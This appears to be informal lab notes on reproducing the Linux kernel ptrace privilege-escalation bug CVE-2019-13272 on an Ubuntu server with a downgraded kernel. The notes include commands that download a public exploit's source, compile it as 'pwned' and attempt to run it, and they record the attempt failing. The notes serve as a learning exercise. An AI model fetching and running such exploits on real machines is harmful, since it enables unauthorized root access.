https://nvd.nist.gov/vuln/detail/CVE-2019-13272
//info//

In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker).

//

Used an 'ubuntu server'
kernel 5.1.16 (less than the 5.1.17 kernel of the bug)

How to easily change your current kernel:
- https://www.how2shout.com/linux/how-to-change-default-kernel-in-ubuntu-22-04-20-04-lts/
took a bit of time to download the kernel, updates and all
make sure choosing correct kernel on start up. was originally getting 'kernel panic' and automatically forcing an exit

// did this then changed mind as a separate user was not needed//
for purpose of demo, made a temporary user ID. not sudo ID.

adduser someuser
echo usermod --lock someuser | at now + 10 minutes
// did this then changed mind as a separate user was not needed//

sudo -v to check for sudo right

created a text file in sudo directory
- sudo apt-get install vim (just to check that vim was indeed installed)
chmod o-r demo.txt (took away everyones read permission)
- https://www.pluralsight.com/blog/it-ops/linux-file-permissions

chmod u-r demo.txt (likely didnt need to)
sudo chown root:root demo.txt

checked i was unable to read my file anymore

- sudo chmod 700 demo.txt

still unable to read file

ran the
- wget https://github.com/jas502n/CVE-2019-13272
- gcc -s CVE-2019-13272 -o pwned
-even moved it to /usr/local/bin due to trying to fix errors... failed!! needed to do the below instead.

(dont forget the 'n' at the end of jas502n)

likely should of run
- wget https://raw.githubusercontent.com/jas502n/CVE-2019-13272/master/CVE-2019-13272.c
^^^ WORKED was able to run the
- gcc -s CVE-2019-13272.c -o pwned
although i did make sure gcc was up to date previously (do need gcc for compiling .c)
- https://linuxhint.com/install_gcc_ubuntu/

even tried git clone
- https://github.com/jas502n/CVE-2019-13272.git


DESPITE pulling a grep command on the only similar file ( "/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper",) path.. (/usr/lib/x86_64-linux-gnu/) neither kernel had any of the desegnated compatible helpers.
perhaps unable to fully separate from the new kernel?

had NO compatible helpers. unable to find anything useful in the package-system-locked, nor the blacklists. was not risking messing up blacklisted drivers.
